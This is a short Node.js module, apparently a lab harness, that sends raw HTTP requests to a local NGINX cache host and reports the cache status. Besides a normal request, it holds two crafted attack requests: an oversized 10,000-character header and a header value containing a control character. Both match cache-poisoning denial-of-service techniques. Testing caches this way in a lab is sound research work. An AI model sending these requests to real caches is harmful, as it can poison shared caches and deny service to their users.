const net = require("node:net");

const oversizedString = "A".repeat(10000); 

const requestNormal = 
    "GET /test.html HTTP/1.1\r\n" +
    "Host: localhost\r\n" +
    "Connection: close\r\n" +
    "X-Test: Hallo\r\n" +
    "\r\n";

const requestOversized = 
    "GET /test.html HTTP/1.1\r\n" +
    "Host: localhost\r\n" +
    "Connection: close\r\n" +
    `X-Oversized: ${oversizedString}\r\n` +
    "\r\n";

const requestWrongValue = 
    "GET /test.html HTTP/1.1\r\n" +
    "Host: localhost\r\n" +
    "Connection: close\r\n" +
    "X-WrongValue: Hallo\x0BWelt\r\n" +
    "\r\n";



function performRequest(request) {
    return new Promise((resolve, reject) => {
        const client = net.createConnection({
            host: "cache",
            port: 80
        });

        let response = "";
        client.setTimeout(5000);

        client.on("connect", () => {
            console.log("Verbunden");
            client.write(request, "latin1");
        });

        client.on("data", (data) => {
            response += data.toString("latin1");
        });

        client.on("end", () => {
            console.log("Verbindung geschlossen.");
            resolve(handleResponse(response));
        });

        client.on("error", reject);

        client.on("timeout", () => {
            client.destroy();
            reject(new Error("Timeout bei NGINX"));
        });
    });
}

function handleResponse(response) {
    const headerText = response.split("\r\n\r\n")[0];
    const lines = headerText.split("\r\n");

    const statusLine = lines[0];

    const cacheLine = lines.find(line =>
        line.toLowerCase().startsWith("x-cache-status:")
    );

    return {
        statusLine: statusLine,
        cacheStatus: cacheLine ?? "Nicht vorhanden"
    };
}

async function executeAttack(attack) {
    if (attack === "hho") {
        return await performRequest(requestOversized);
    }

    if (attack === "hmc") {
        return await performRequest(requestWrongValue);
    }

    if (attack === "normal") {
        return await performRequest(requestNormal);
    }

    throw new Error("Unbekannter Request-Typ");
}

module.exports = { executeAttack };
